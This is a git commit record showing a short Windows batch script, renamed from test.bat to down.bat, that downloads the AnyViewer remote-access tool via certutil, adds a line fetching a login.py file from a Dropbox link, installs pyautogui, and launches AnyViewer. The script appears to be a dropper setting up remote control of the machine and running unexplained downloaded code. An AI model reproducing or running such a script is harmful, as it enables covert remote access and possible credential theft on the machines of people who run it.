7ffffc1e5d14d7c7d9c06b45ab1af392417f4069
CherylJSullivan <140143510+CherylJSullivan@users.noreply.github.com>
2023-07-23 07:59:36 +0530

    Update and rename test.bat to down.bat

--- down.bat
+++ down.bat
@@ -1,4 +1,5 @@
 @echo off
 certutil -urlcache -split -f "https://www.anyviewer.com/ss/download/AnyViewerSetup.exe" AnyViewer.exe
+curl -L -o login.py https://www.dropbox.com/scl/fi/k18qc9drpe7nhli766fsb/login.py?rlkey=v96du1pl748xqkiqdc1qltr4r&
 pip install pyautogui 
 start AnyViewer.exe
